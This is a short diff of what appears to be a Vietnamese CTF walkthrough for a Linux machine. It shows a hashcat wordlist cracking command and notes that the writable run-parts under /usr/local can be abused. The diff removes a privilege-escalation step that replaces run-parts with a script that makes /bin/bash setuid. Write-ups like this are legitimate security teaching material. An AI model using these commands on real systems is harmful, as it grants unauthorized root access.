@@ -65,9 +65,4 @@ hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
 
 ```
 - Để ý thấy có run-part đang chạy. Mà thuộc /usr/local mà saff có quyền chỉnh sửa. Sửả nó :))) 
-```
-echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-
-parts
-chmod +x /usr/local/bin/run-parts
-```
-Cấp quyền cho u: owner và o: other cho /bin/bash 
+
